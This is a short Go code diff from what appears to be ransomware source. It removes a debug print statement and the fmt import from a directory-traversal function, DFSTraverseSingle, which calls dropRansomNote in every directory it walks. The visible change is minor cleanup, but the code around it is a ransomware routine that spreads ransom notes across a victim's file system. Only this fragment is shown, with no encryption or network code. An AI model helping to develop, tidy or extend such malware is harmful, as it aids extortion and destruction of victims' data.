@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"io/ioutil"
 	"log"
 	"strings"
@@ -14,7 +13,7 @@ func DFSTraverseSingle(dirPath string) {
 	}
 
 	for _, file := range files {
-		fmt.Println(dirPath+"\\"+file.Name(), file.IsDir())
+		// fmt.Println(dirPath+"\\"+file.Name(), file.IsDir())
 		if file.IsDir() {
 			dropRansomNote(dirPath)
 			// fmt.Println(file.Name(), "is dir name")
